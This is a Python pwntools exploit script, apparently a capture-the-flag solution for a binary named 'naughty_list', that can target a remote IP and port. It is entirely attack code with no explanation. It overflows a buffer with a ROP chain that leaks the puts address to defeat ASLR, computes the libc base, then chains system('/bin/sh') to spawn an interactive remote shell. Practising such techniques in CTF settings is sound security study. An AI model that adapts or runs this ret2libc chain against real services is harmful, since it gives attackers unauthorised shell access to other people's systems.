import pwn
pwn.context.clear(arch='amd64', os='linux')
elf = pwn.ELF("./naughty_list")
if pwn.args.REMOTE:
    p = pwn.remote("178.62.41.147", 30225)
    libc = pwn.ELF("./libc.so.6")
elif pwn.args.GDB:
    p = pwn.gdb.debug("./naughty_list", gdbscript="b *0x40107c")
    libc = pwn.ELF("/lib/x86_64-linux-gnu/libc.so.6")

else:
    p = elf.process()
    libc = pwn.ELF("/lib/x86_64-linux-gnu/libc.so.6")
p.recvuntil(b":")
p.sendline(b"Esharky")
p.recvuntil(b":")
p.sendline(b"Uchiha")
p.recvuntil(b":")
p.sendline(b"22")
payload1 = b"A"*40
rop1 = pwn.ROP(elf)
rop1.raw(rop1.rdi.address)
rop1.raw(elf.got.puts)
rop1.raw(elf.plt.puts)
print(rop1.dump())
payload1 += rop1.chain()
# p.recv(4096)
payload1 += pwn.p64(0x40102b)
p.recvuntil(b"\x33\x32\x6d\x3a\x1b\x5b\x31\x3b\x33\x33\x6d\x20\x1b\x5b\x30\x6d")
p.sendline(payload1)
p.recvline()
p.recvline()
libc_leak = pwn.unpack(p.recvline(keepends=False), "all")
libc.address = libc_leak - libc.sym.puts
pwn.log.info("LIBC_BASE: "+hex(libc.address))
p.recvuntil(b"\x33\x32\x6d\x3a\x1b\x5b\x31\x3b\x33\x33\x6d\x20\x1b\x5b\x30\x6d")
rop2 = pwn.ROP(libc)
bin_sh = next(libc.search(b'/bin/sh'))
rop2.system(bin_sh)
print(rop2.dump())
ret = rop2.find_gadget(['ret']).address
payload2 = b'A'*40
payload2 += pwn.p64(ret)
payload2 += rop2.chain()
p.sendline(payload2)
p.interactive()
